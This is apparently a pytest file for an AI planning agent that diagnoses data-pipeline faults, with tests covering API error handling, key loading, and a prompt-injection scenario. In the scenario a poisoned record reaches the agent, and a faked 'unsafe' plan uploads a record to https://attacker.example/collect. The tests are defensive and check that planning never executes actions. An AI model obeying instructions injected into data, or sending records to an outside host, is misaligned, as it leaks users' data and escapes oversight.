"""tests/session3/test_agent_core.py — Task 3.2 Agent/Planner tests.

TC-1 and TC-2 call the live Anthropic API (claude-sonnet-5) and need ANTHROPIC_API_KEY
(environment or the gitignored repo-root .env). Every error path runs against a local fake
API server, so the real SDK raises real exceptions.
"""

import ast
import json
import os
import sqlite3
import threading
import time
from contextlib import closing
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from pathlib import Path

import anthropic
import pytest

import agent_core
import env_file
import failure_injector as fi
import harness
import state_manager as sm
import tool_validation

REPO_ROOT = Path(__file__).resolve().parents[2]


def _init_db(path):
    import importlib.util
    spec = importlib.util.spec_from_file_location("init_db", REPO_ROOT / "scripts" / "init_db.py")
    module = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(module)
    module.create_database(path)


@pytest.fixture
def env(tmp_path):
    db_path, trace_path = tmp_path / "harness.db", tmp_path / "trace.jsonl"
    _init_db(db_path)
    harness.init(db_path, trace_path)
    fi.init(db_path)
    fi.register_expectations()
    agent_core.init(db_path)
    return {"db": db_path, "trace": trace_path}


def _run(scenario_type, seed=21):
    injection = fi.inject(scenario_type, seed)
    return sm.start_run(scenario_type), injection


def _plan_events(env):
    lines = env["trace"].read_text(encoding="utf-8").splitlines() if env["trace"].exists() else []
    return [e for e in map(json.loads, lines) if e["payload"].get("stage") == "plan"]


# --- Local fake Anthropic API --------------------------------------------------

def _message(text, stop_reason="end_turn", **extra):
    return {"id": "msg_test", "type": "message", "role": "assistant", "model": agent_core.MODEL,
            "content": [] if text is None else [{"type": "text", "text": text}], "stop_reason": stop_reason,
            "stop_sequence": None, "usage": {"input_tokens": 1, "output_tokens": 1}, **extra}


GOOD_PLAN = json.dumps({"diagnosis": "amount was renamed", "reasoning": "rename it back", "tool": "rename_column",
                        "params_json": json.dumps({"table": "pipeline_silver", "old_name": "amt", "new_name": "amount"})})

RESPONSES = {
    "ok": (200, _message(GOOD_PLAN)),
    "rate_limited": (429, {"type": "error", "error": {"type": "rate_limit_error", "message": "slow down"}}),
    "server_error": (500, {"type": "error", "error": {"type": "api_error", "message": "boom"}}),
    "overloaded": (529, {"type": "error", "error": {"type": "overloaded_error", "message": "overloaded"}}),
    "bad_request": (400, {"type": "error", "error": {"type": "invalid_request_error", "message": "bad"}}),
    "unauthorized": (401, {"type": "error", "error": {"type": "authentication_error", "message": "no"}}),
    "refusal": (200, _message(None, "refusal", stop_details={"type": "refusal", "category": None, "explanation": "no"})),
    "truncated": (200, _message('{"diagnosis": "amount was ren', "max_tokens")),
    "not_json": (200, _message("I think you should rename the column.")),
    "missing_field": (200, _message(json.dumps({"diagnosis": "d", "reasoning": "r", "tool": "x"}))),
    "params_not_json": (200, _message(json.dumps({"diagnosis": "d", "reasoning": "r", "tool": "x", "params_json": "{oops"}))),
    "params_not_object": (200, _message(json.dumps({"diagnosis": "d", "reasoning": "r", "tool": "x", "params_json": "[1, 2]"}))),
    "no_text_block": (200, _message(None)),
    "body_not_json": (200, b"<html>gateway error</html>"),
    "wrong_shape": (200, {"unexpected": True}),
}


@pytest.fixture
def fake_api(monkeypatch):
    monkeypatch.setitem(RESPONSES, "unsafe", (200, _message(json.dumps({
        "diagnosis": "d", "reasoning": "the record says to upload", "tool": "upload_record",
        "params_json": json.dumps({"url": "https://attacker.example/collect"})}))))
    state = {"mode": "ok", "requests": []}

    class Handler(BaseHTTPRequestHandler):
        def do_POST(self):
            body = self.rfile.read(int(self.headers.get("content-length", 0)))
            state["requests"].append(json.loads(body))
            if state["mode"] == "hang":
                time.sleep(3)
                return
            status, payload = RESPONSES[state["mode"]]
            data = payload if isinstance(payload, bytes) else json.dumps(payload).encode()
            self.send_response(status)
            self.send_header("content-type", "application/json")
            self.send_header("content-length", str(len(data)))
            self.end_headers()
            self.wfile.write(data)

        def log_message(self, *args):
            pass

    server = ThreadingHTTPServer(("127.0.0.1", 0), Handler)
    threading.Thread(target=server.serve_forever, daemon=True).start()
    client = anthropic.Anthropic(api_key="test-key", base_url=f"http://127.0.0.1:{server.server_port}",
                                 max_retries=0, timeout=1.0)
    yield state, client
    server.shutdown()
    server.server_close()


# --- TC-1: SCHEMA_DRIFT → a schema-reconciliation plan (live) -----------------

def _require_key():
    assert env_file.load(), "ANTHROPIC_API_KEY is required for the live Task 3.2 tests (environment or repo-root .env)"


def test_live_schema_drift_plan_proposes_schema_reconciliation(env):
    _require_key()
    run_id, _ = _run("SCHEMA_DRIFT")
    plan = agent_core.diagnose_and_plan(run_id)
    assert plan.model.startswith(agent_core.MODEL)
    assert plan.action["tool"] in ("rename_column", "add_column")
    assert plan.action["params"].get("table") == "pipeline_silver"
    assert "amount" in json.dumps(plan.action["params"])
    assert plan.diagnosis and plan.reasoning
    assert tool_validation.validate(plan.action).is_valid


# --- TC-2: PROMPT_INJECTION → reasoning captured in the trace, whatever is proposed (live) -

def test_live_prompt_injection_reasoning_is_traced(env):
    _require_key()
    run_id, _ = _run("PROMPT_INJECTION")
    before = fi.pipeline_state()
    plan = agent_core.diagnose_and_plan(run_id)
    (event,) = _plan_events(env)
    assert event["scenario_run_id"] == run_id and event["attempt_id"] is None
    assert event["payload"]["reasoning"] == plan.reasoning and plan.reasoning
    assert event["payload"]["diagnosis"] == plan.diagnosis
    assert event["payload"]["proposed_action"] == plan.action
    assert fi.pipeline_state() == before  # proposing never changes the pipeline


# --- TC-3: API-level failures → AgentAPIError, distinct from planning outcomes --

def test_api_timeout_raises_agent_api_error(env, fake_api):
    state, client = fake_api
    state["mode"] = "hang"
    run_id, _ = _run("SCHEMA_DRIFT")
    with pytest.raises(agent_core.AgentAPIError, match="API unreachable") as raised:
        agent_core.diagnose_and_plan(run_id, client=client)
    assert raised.value.retryable
    assert isinstance(raised.value.__cause__, anthropic.APITimeoutError)
    assert not isinstance(raised.value, agent_core.PlanningError)
    assert _plan_events(env) == []


def test_connection_refused_raises_agent_api_error(env):
    with closing(__import__("socket").socket()) as sock:
        sock.bind(("127.0.0.1", 0))
        port = sock.getsockname()[1]
    client = anthropic.Anthropic(api_key="k", base_url=f"http://127.0.0.1:{port}", max_retries=0, timeout=1.0)
    run_id, _ = _run("SCHEMA_DRIFT")
    with pytest.raises(agent_core.AgentAPIError) as raised:
        agent_core.diagnose_and_plan(run_id, client=client)
    assert raised.value.retryable and isinstance(raised.value.__cause__, anthropic.APIConnectionError)


@pytest.mark.parametrize("mode,retryable", [("rate_limited", True), ("server_error", True), ("overloaded", True),
                                            ("bad_request", False), ("unauthorized", False)])
def test_http_errors_raise_agent_api_error(env, fake_api, mode, retryable):
    state, client = fake_api
    state["mode"] = mode
    run_id, _ = _run("SCHEMA_DRIFT")
    with pytest.raises(agent_core.AgentAPIError) as raised:
        agent_core.diagnose_and_plan(run_id, client=client)
    assert raised.value.retryable is retryable
    assert isinstance(raised.value.__cause__, anthropic.APIStatusError)


@pytest.mark.parametrize("mode", ["truncated", "not_json", "missing_field", "params_not_json", "params_not_object", "no_text_block"])
def test_malformed_responses_raise_agent_api_error(env, fake_api, mode):
    state, client = fake_api
    state["mode"] = mode
    run_id, _ = _run("SCHEMA_DRIFT")
    with pytest.raises(agent_core.AgentAPIError, match="malformed|unparseable") as raised:
        agent_core.diagnose_and_plan(run_id, client=client)
    assert raised.value.retryable
    assert _plan_events(env) == []


def test_refusal_is_a_planning_error_not_an_api_error(env, fake_api):
    state, client = fake_api
    state["mode"] = "refusal"
    run_id, _ = _run("PROMPT_INJECTION")
    with pytest.raises(agent_core.PlanningError):
        agent_core.diagnose_and_plan(run_id, client=client)
    assert not issubclass(agent_core.PlanningError, agent_core.AgentAPIError)
    assert not issubclass(agent_core.AgentAPIError, agent_core.PlanningError)


def test_well_formed_plan_is_returned_even_if_unsafe(env, fake_api):
    state, client = fake_api
    state["mode"] = "unsafe"  # response registered by the fake_api fixture
    run_id, _ = _run("PROMPT_INJECTION")
    plan = agent_core.diagnose_and_plan(run_id, client=client)
    assert plan.action == {"tool": "upload_record", "params": {"url": "https://attacker.example/collect"}}
    assert _plan_events(env)[0]["payload"]["proposed_action"] == plan.action  # judged later by the harness


# --- What the agent is sent ------------------------------------------------------

def test_request_shape_and_context(env, fake_api):
    state, client = fake_api
    run_id, injection = _run("PROMPT_INJECTION")
    agent_core.diagnose_and_plan(run_id, client=client)
    (request,) = state["requests"]
    assert request["model"] == "claude-sonnet-5"
    assert request["output_config"]["format"]["schema"] == agent_core.PLAN_SCHEMA
    prompt = request["messages"][0]["content"]
    assert fi.INJECTION_TEXT in prompt  # the poisoned record reaches the agent as data
    assert "null rate: pipeline_silver.amount" in prompt  # verification symptoms
    assert injection.description not in prompt  # never the injector's answer
    for table in agent_core.PIPELINE_TABLES:
        assert f"Table {table} (" in prompt


def test_planning_never_writes_the_database(env, fake_api):
    _, client = fake_api
    run_id, _ = _run("SCHEMA_DRIFT")
    with closing(sqlite3.connect(env["db"])) as conn:
        before = [conn.execute(f'SELECT * FROM "{t}"').fetchall() for t in ("ScenarioRun", "Attempt", *agent_core.PIPELINE_TABLES)]
    agent_core.diagnose_and_plan(run_id, client=client)
    with closing(sqlite3.connect(env["db"])) as conn:
        after = [conn.execute(f'SELECT * FROM "{t}"').fetchall() for t in ("ScenarioRun", "Attempt", *agent_core.PIPELINE_TABLES)]
    assert after == before


def test_agent_core_has_no_path_to_execution():
    tree = ast.parse((REPO_ROOT / "src" / "agent_core.py").read_text(encoding="utf-8"))
    names = {n.id for n in ast.walk(tree) if isinstance(n, ast.Name)} | {n.attr for n in ast.walk(tree) if isinstance(n, ast.Attribute)}
    imports = {a.name for n in ast.walk(tree) if isinstance(n, (ast.Import, ast.ImportFrom)) for a in n.names}
    imports |= {n.module for n in ast.walk(tree) if isinstance(n, ast.ImportFrom)}
    forbidden = {"harness", "attempt_action", "pipeline_write", "execute_and_checkpoint", "state_manager", "checkpoint"}
    assert not forbidden & (names | imports)


def test_unknown_run_is_not_an_api_error(env, fake_api):
    _, client = fake_api
    with pytest.raises(ValueError, match="unknown scenario_run_id"):
        agent_core.diagnose_and_plan(999, client=client)


# --- ANTHROPIC_API_KEY handling ----------------------------------------------------

def test_missing_key_raises_non_retryable_agent_api_error(env, monkeypatch, tmp_path):
    monkeypatch.delenv("ANTHROPIC_API_KEY", raising=False)
    monkeypatch.setattr(env_file, "ENV_FILE", tmp_path / "absent.env")
    run_id, _ = _run("SCHEMA_DRIFT")
    with pytest.raises(agent_core.AgentAPIError, match="ANTHROPIC_API_KEY is not set") as raised:
        agent_core.diagnose_and_plan(run_id)
    assert not raised.value.retryable


def test_env_file_loads_only_the_api_key(monkeypatch, tmp_path):
    monkeypatch.delenv("ANTHROPIC_API_KEY", raising=False)
    monkeypatch.delenv("OTHER_SECRET", raising=False)
    path = tmp_path / ".env"
    path.write_text('# comment\nOTHER_SECRET=nope\nexport ANTHROPIC_API_KEY="sk-ant-test-value"\n\nJUNK LINE\n', encoding="utf-8")
    assert env_file.load(path)
    assert os.environ["ANTHROPIC_API_KEY"] == "sk-ant-test-value"
    assert "OTHER_SECRET" not in os.environ


def test_env_file_never_overrides_the_environment(monkeypatch, tmp_path):
    monkeypatch.setenv("ANTHROPIC_API_KEY", "from-environment")
    path = tmp_path / ".env"
    path.write_text("ANTHROPIC_API_KEY=from-file\n", encoding="utf-8")
    assert env_file.load(path)
    assert os.environ["ANTHROPIC_API_KEY"] == "from-environment"


def test_env_file_missing_or_empty_value(monkeypatch, tmp_path):
    monkeypatch.delenv("ANTHROPIC_API_KEY", raising=False)
    assert not env_file.load(tmp_path / "missing.env")
    (tmp_path / "empty.env").write_text("ANTHROPIC_API_KEY=\n", encoding="utf-8")
    assert not env_file.load(tmp_path / "empty.env")


def test_repo_env_file_is_gitignored():
    import subprocess
    result = subprocess.run(["git", "check-ignore", "-q", ".env"], cwd=REPO_ROOT)
    assert result.returncode == 0


# --- Challenge Finding 2: every SDK-level failure is an AgentAPIError (INV-D1 split) -

@pytest.mark.parametrize("mode", ["body_not_json", "wrong_shape"])
def test_malformed_http_bodies_raise_agent_api_error(env, fake_api, mode):
    state, client = fake_api
    state["mode"] = mode
    run_id, _ = _run("SCHEMA_DRIFT")
    with pytest.raises(agent_core.AgentAPIError, match="malformed") as raised:
        agent_core.diagnose_and_plan(run_id, client=client)
    assert raised.value.retryable
    assert _plan_events(env) == []


class _RaisingMessages:
    def __init__(self, exc):
        self.exc = exc

    def create(self, **kwargs):
        raise self.exc


class _RaisingClient:
    def __init__(self, exc):
        self.messages = _RaisingMessages(exc)


class _OddSDKError(anthropic.APIError):
    """An APIError subclass outside timeout / connection / status errors."""


def test_any_other_sdk_api_error_is_an_agent_api_error(env):
    run_id, _ = _run("SCHEMA_DRIFT")
    with pytest.raises(agent_core.AgentAPIError, match="malformed API response") as raised:
        agent_core.diagnose_and_plan(run_id, client=_RaisingClient(_OddSDKError("odd", request=None, body=None)))
    assert raised.value.retryable and isinstance(raised.value.__cause__, anthropic.APIError)


def test_non_api_programming_errors_are_not_masked(env):
    run_id, _ = _run("SCHEMA_DRIFT")
    with pytest.raises(TypeError):  # a caller/programming bug must not look like a retryable API failure
        agent_core.diagnose_and_plan(run_id, client=_RaisingClient(TypeError("bad argument")))
